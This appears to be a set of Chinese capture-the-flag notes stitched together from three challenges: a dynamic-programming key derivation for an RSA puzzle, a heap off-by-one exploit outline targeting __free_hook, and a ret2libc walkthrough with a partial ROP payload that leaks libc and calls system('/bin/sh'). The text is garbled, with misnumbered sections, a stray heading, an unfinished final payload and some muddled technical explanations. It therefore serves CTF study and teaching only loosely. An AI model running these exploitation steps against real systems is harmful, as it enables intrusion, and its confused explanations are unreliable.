题目名称 ｜ SOLVED ｜ Working:X1ao

原解密就是一个RSA解密但是key有一个获取方法，枚举了一个范围的数字
数字必须是奇数（最低位为 1）。
数字的二进制形式中 不能包含连续的 4 个 1 或连续的 4 个 0。
然后根据数字的数量对key值进行加减

from Crypto.Util.number import *
from gmpy2 import next_prime

def count_valid_binary_strings(l):
    dp = [{} for _ in range(l + 1)]
    
    dp[1] = {0b1: 1}  
    
    for length in range(2, l + 1):
        for last_digits, count in dp[length - 1].items():
            for next_bit in [0, 1]:
                new_last_digits = ((last_digits << 1) | next_bit) & 0b1111  
                if new_last_digits != 0b1111 and new_last_digits != 0b0000:  
                    if new_last_digits not in dp[length]:
                        dp[length][new_last_digits] = 0
                    dp[length][new_last_digits] += count
    
    key = sum(count for last_digits, count in dp[l].items() if last_digits & 0b1 == 1)
    return key

动态规划函数 count_valid_binary_strings 的目标是统计长度为 l 的二进制字符串的数量，要求它们的最后四位（即连续的四个比特）不全是 1111 或 0000，并且最终以 1 结尾。以下是函数具体逻辑的分解：

  1. 状态定义
    dp[length] 是一个字典，用来存储当前长度为 length 的所有可能二进制字符串的统计信息。

字典的键是这些字符串的最后四位（用整数表示）。
字典的值是以对应最后四位为结尾的二进制字符串数量。
初始化
dp[1] = {0b1: 1} 表示长度为 1 且以 1 结尾的字符串数量为 1。
2. 转移过程
从长度 length - 1 的字符串扩展到长度 length：

对于 dp[length - 1] 中每种可能的最后四位 last_digits：
尝试在其末尾加 0 或 1，形成新的最后四位 new_last_digits：
python
复制代码
new_last_digits = ((last_digits << 1) | next_bit) & 0b1111
last_digits << 1：将原来的最后四位左移一位，为下一位留出空间。
| next_bit：添加新的一位 0 或 1。
& 0b1111：只保留结果的低四位。
检查新生成的四位是否符合要求（不是 1111 或 0000）：
python
复制代码
if new_last_digits != 0b1111 and new_last_digits != 0b0000:
如果符合要求，将其加入到 dp[length]：
python
复制代码
if new_last_digits not in dp[length]:
dp[length][new_last_digits] = 0
dp[length][new_last_digits] += count
3. 目标条件过滤
最终，我们只统计长度为 l 且以 1 结尾的字符串：

python
复制代码
key = sum(count for last_digits, count in dp[l].items() if last_digits & 0b1 == 1)
last_digits & 0b1 == 1：检查最低位是否为 1。
将满足条件的所有计数累加，得到 key。
4. 总结
函数通过构造和维护 dp 表，逐步计算满足条件的二进制字符串的数量：

不允许连续 4 位全 1111 或 0000。
最终以 1 结尾。

1. off-by-one 错误

off-by-one 错误通常发生在程序中访问数组或缓冲区时，未正确计算边界，导致访问超出预期的内存区域。在这道题中，off-by-one 可能出现在以下几个方面：

  • 内存分配和写入:
    在 add_entry 函数中，程序通过 fgets 获取用户输入的故事，并将其写入到堆分配的内存块中。输入的大小 n 是由用户提供的，并且 fgets 会读取最多 n-1 个字符，这可能导致缓冲区溢出，尤其是如果没有正确处理字符串结束符 \0 时。

    v0[strcspn(v0, "\n")] = 0; 这一行代码用于移除输入字符串末尾的换行符，防止内存泄漏。如果存在 off-by-one 错误，可能导致写入的内存超出了预期的边界，修改了相邻的内存块。

2. 伪造大块覆盖两个小块

这种利用方式通常涉及到 堆合并（bin merging） 或 堆碎片化（heap fragmentation） 技术。假设程序允许用户分配多个小块内存，当攻击者尝试分配一个大块时（比如，调用 add() 分配比小块大的内存），他们可以通过内存碎片化的方式使得这些小块和大块相邻，从而覆盖多个小块的内容。

  • 在代码中，用户可以通过 add() 调用多次分配内存，攻击者可能会通过反复调用 add() 和 delete()，创建合适的内存布局。
  • 通过“伪造大块”操作，攻击者可以让两个小块合并成一个大块（或者覆盖它们）。这会破坏原来的堆结构，并可能导致 use-after-free 或 堆溢出 等问题。

3. 泄漏 libc 地址

一旦攻击者通过堆操作（例如 add() 和 delete()）创建了正确的内存布局并利用 off-by-one 错误破坏了堆结构，他们就可以通过泄漏堆地址来获取 libc 基址。

  • 在原程序中，通过 show() 函数，攻击者可以读取堆中某个区域的内容，并泄漏出堆的地址。结合这些地址和已知的偏移量，攻击者可以计算出 libc 库的基址。
  • 具体来说，攻击者可以通过泄漏的地址，推算出 __malloc_hook 或 __free_hook 的地址。这样，他们就能够在堆上执行任意代码。

4. 覆盖 fd 打 __free_hook

fd 是指向堆块的前继块的指针，它在管理内存时起着重要作用。如果攻击者能够覆盖堆块中的 fd 指针，他们就可以控制后续 free() 操作时的行为。

  • 通过**覆盖 fd**，攻击者可以让 free() 调用 __free_hook，而 __free_hook 是一个函数指针，可以用来指向任意函数。
  • 攻击者的目标是将 __free_hook 覆盖为 system 函数的地址。然后，当程序尝试释放一个内存块时，实际上会触发 system("/bin/sh")，从而执行恶意命令。

  2. 泄漏堆地址:

从主函数和给出的脚本来看，这道 ret2libc 题目利用了函数 get_info 中的栈溢出漏洞。以下是这道题的解决办法总结：

程序分析

  1. 栈溢出点：

    char s[64];
fgets(s, 256, stdin);
    • 定义了大小为 64 字节的缓冲区 s，但用 fgets 从标准输入读取了最多 256 字节的数据。
    • 这导致用户输入可以超出缓冲区的限制，覆盖返回地址，进而劫持控制流。

  2. 漏洞触发条件：

    • 无栈保护（Canary）：因为栈保护会检测溢出，这里需要 checksec 确认没有启用。
    • 可控返回地址：覆盖缓冲区后，可以修改函数返回地址。

  3. 目标保护机制：

    • NX（No-eXecute）：栈不可执行，因此不能直接放置 Shellcode。
    • libc 函数的利用成为主要手段。

攻击思路

第一阶段：泄露 libc 地址

  1. 调用 puts 泄露 libc 中符号地址：

    • 将 puts 的 GOT 表地址加载到 rdi（第一个参数寄存器）。
    • 调用 PLT 表中的 puts 函数，打印 puts 的实际地址。

  2. 恢复程序执行：

    • 泄露后返回到原始函数 get_info，便于第二次攻击。

  3. 计算 libc 基地址：

    • 利用泄露的 puts 地址，减去 libc 中 puts 函数的偏移量，计算出 libc 的基地址。

第二阶段：构造 ROP 链，调用 system("/bin/sh")

  1. 查找 libc 中的目标符号：
    • system：执行系统命令的函数地址。
    • "/bin/sh"：libc 中 /bin/sh 字符串的地址。
  2. 构造 ROP 链：
    • 通过 ROP gadget pop rdi; ret 将 "/bin/sh" 地址加载到 rdi。
    • 调用 system，执行 system("/bin/sh")。
  3. 进入交互模式：
    • 通过远程交互获取 shell。

详细解决步骤

1. 确定溢出偏移

  • 根据程序结构，发现栈上缓冲区到返回地址的偏移量为 64 字节（0x40）。
  • 脚本中实际使用了 0x48（72 字节），说明还包括了额外的 8 字节对齐或其他局部变量。

2. 泄露 libc 地址

  • 构造第一阶段 ROP 链：
    pay = b'\x00'*0x48 + fit(
    pop_rdi_ret,         # 将 GOT 中 puts 的地址放入 rdi
    elf.got["puts"],     # GOT 表中 puts 的地址
    elf.plt["puts"],     # 调用 puts 打印地址
    elf.sym["get_info"]  # 返回到 get_info 继续执行
)

3. 获取 Shell

  • 构造第二阶段 ROP 链：

    binsh,              # libc 中 "/bin/sh" 的地址
